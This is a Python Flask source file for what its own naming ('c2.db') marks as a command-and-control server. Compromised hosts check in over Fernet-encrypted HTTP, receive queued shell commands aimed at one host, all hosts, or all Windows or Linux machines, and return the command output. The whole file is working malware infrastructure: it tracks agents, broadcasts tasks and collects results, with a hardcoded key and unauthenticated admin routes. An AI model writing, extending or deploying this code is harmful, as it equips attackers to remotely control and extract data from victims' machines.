from flask import Flask, request, render_template, jsonify
from cryptography.fernet import Fernet
from datetime import datetime
import sqlite3
import time
import json
import uuid

app = Flask(__name__)

SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k=' 
cipher = Fernet(SECRET_KEY)
DB_FILE = 'c2.db'

def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    try:
        cur.execute(query, args)
        rv = cur.fetchall()
        conn.commit()
        return (rv[0] if rv else None) if one else rv
    finally:
        conn.close()

def init_db():
    query_db('''CREATE TABLE IF NOT EXISTS agents 
                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS results 
                (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, timestamp TEXT, output TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS tasks 
                (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS task_receipts 
                (task_id INTEGER, hostname TEXT)''')

init_db()

@app.route('/')
def dashboard():
    return render_template('index.html')


@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        decrypted_raw = cipher.decrypt(request.data).decode()
        data = json.loads(decrypted_raw)
        host = data.get('hostname', 'unknown')
        os_info = data.get('os', 'Unknown')
        os_family = "WINDOWS" if "Windows" in os_info else "LINUX"
        
        query_db("INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?)",
                 (host, request.remote_addr, os_info, time.strftime('%H:%M:%S'), request.headers.get('Host', 'Direct IP')))

        cmd_row = query_db('''
            SELECT * FROM tasks t
            WHERE (t.target_type = 'ALL' OR t.target_type = ? OR t.target_type = ?)
            AND NOT EXISTS (SELECT 1 FROM task_receipts r WHERE r.task_id = t.id AND r.hostname = ?)
            ORDER BY t.id ASC LIMIT 1''', (f"BROADCAST_{os_family}", host, host), one=True)
        
        cmd = "none"
        if cmd_row:
            cmd = cmd_row['command']
            query_db("INSERT INTO task_receipts (task_id, hostname) VALUES (?, ?)", (cmd_row['id'], host))

        return cipher.encrypt(cmd.encode())
    except Exception:
        return "Error", 400

@app.route('/api/stats')
def api_stats():
    now = datetime.now()
    agents = [dict(row) for row in query_db("SELECT * FROM agents")]
    results = [dict(row) for row in query_db("SELECT * FROM results ORDER BY timestamp DESC LIMIT 100")]
    tasks = [dict(row) for row in query_db("SELECT * FROM tasks")]
    
    active_count = 0
    win_count = 0
    lin_count = 0

    for a in agents:
        try:
            last_dt = datetime.combine(now.date(), datetime.strptime(a['last_seen'], '%H:%M:%S').time())
            a['status'] = "ONLINE" if (now - last_dt).total_seconds() < 45 else "OFFLINE"
            if a['status'] == "ONLINE": 
                active_count += 1
                if "Windows" in a['os']: win_count += 1
                else: lin_count += 1
        except: a['status'] = "UNKNOWN"

    queue_data = []
    for t in tasks:
        receipts = [r['hostname'] for r in query_db("SELECT hostname FROM task_receipts WHERE task_id = ?", (t['id'],))]
        
        # Determine if the task is finished
        is_complete = False
        target = t['target_type']
        
        if target == "ALL" and len(receipts) >= len(agents) and len(agents) > 0: is_complete = True
        elif target == "BROADCAST_WINDOWS" and len(receipts) >= win_count and win_count > 0: is_complete = True
        elif target == "BROADCAST_LINUX" and len(receipts) >= lin_count and lin_count > 0: is_complete = True
        elif target not in ["ALL", "BROADCAST_WINDOWS", "BROADCAST_LINUX"] and len(receipts) > 0: is_complete = True

        if not is_complete:
            queue_data.append({"target": target, "command": t['command'], "seen_list": receipts})

    return jsonify({"agents": agents, "results": results, "queue": queue_data, "total_count": active_count})

@app.route('/result', methods=['POST'])
def get_result():
    try:
        decrypted_output = cipher.decrypt(request.data).decode()
        if '|' not in decrypted_output: return "Format Error", 400
        
        host, output = decrypted_output.split('|', 1)
        
        # Robust OS Lookup
        agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
        if agent:
            os_type = "Windows" if "Windows" in agent['os'] else "Linux"
        else:
            os_type = "Unknown"
        
        query_db("INSERT INTO results (id, hostname, os, timestamp, output) VALUES (?, ?, ?, ?, ?)",
                 (str(uuid.uuid4())[:8], host, os_type, time.strftime('%H:%M:%S'), output))
        return "OK", 200
    except Exception as e:
        print(f"Result Error: {e}")
        return "Error", 400

@app.route('/admin/send_cmd', methods=['POST'])
def send_command():
    query_db("INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)", 
             (request.form.get('target'), request.form.get('command'), time.strftime('%H:%M:%S')))
    return "OK", 200

@app.route('/admin/purge_tasks', methods=['POST'])
def purge_tasks():
    query_db("DELETE FROM tasks")
    query_db("DELETE FROM task_receipts")
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)